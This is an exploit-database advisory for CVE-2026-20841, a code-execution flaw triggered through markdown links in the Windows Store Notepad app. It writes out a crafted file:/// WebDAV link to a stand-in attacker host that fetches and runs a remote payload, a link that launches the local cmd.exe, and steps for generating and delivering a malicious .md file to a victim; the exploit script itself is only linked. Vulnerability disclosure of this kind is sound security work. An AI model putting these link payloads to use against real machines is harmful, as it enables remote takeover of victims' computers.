---
title: Windows Notepad App (Store Version) - Remote/Local Code Execution via Markdown Link
url: https://cxsecurity.com/issue/WLB-2026030006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-02
fetch_date: 2026-03-03T04:11:33.380172
---

# Windows Notepad App (Store Version) - Remote/Local Code Execution via Markdown Link

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Windows Notepad App (Store Version) - Remote/Local Code Execution via Markdown Link** **2026.03.02**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-20841](https://cxsecurity.com/cveshow/CVE-2026-20841/ "Click to see CVE-2026-20841")**  CWE: **N/A** | |

# Exploit Title: Windows Notepad App (Store Version) - Remote/Local Code Execution via Markdown Link
# Date: 2026-02-26
# Exploit Author: nu11secur1ty
# Vendor Homepage: https://www.microsoft.com
# Software Link: https://apps.microsoft.com/detail/9msmlrh6lzf3
# Version: Windows Notepad App versions 11.0.0 through 11.2510.14.0
# Tested on: Windows 11 (Notepad 11.2510.14.0)
# CVE: CVE-2026-20841
# CVSS: 8.8 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
Description:
The Windows Notepad App (Microsoft Store version) fails to properly validate
protocol handlers in markdown links. When a user Ctrl+Click on a crafted link
in a .md file, Notepad passes the raw URI to ShellExecuteExW() without
sufficient filtering . This allows execution of arbitrary binaries
in TWO distinct attack scenarios:
1. REMOTE CODE EXECUTION (RCE) - Network Scenario:
- Attacker hosts payload on WebDAV/SMB share
- Link format: `file:///\\attacker@port\DavWWWRoot\payload.py`
- Windows fetches and executes remote payload when clicked
- Confirmed by Microsoft: "load and execute remote files"
2. LOCAL CODE EXECUTION - Offline Scenario:
- Attacker with local access executes system binaries
- Link format: `file://C:/Windows/System32/cmd.exe`
- No network required - payloads already on disk
Affected versions: 11.0.0 through 11.2510.14.0
Fixed in: 11.2510.14.0+ (requires manual Store update)
Note: The patch adds a warning dialog but does NOT block execution
Usage:
1. Modify the attacker IP in remote payloads to your machine
2. Run the script to generate malicious .md file
3. Host payloads on WebDAV/SMB server (for remote attack)
4. Deliver .md file to target
5. Victim opens in vulnerable Notepad and Ctrl+Click any link
# Exploit:
[href](https://github.com/nu11secur1ty/Windows11Exploits/blob/main/2026/CVE-2026-20841/exploit.md)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top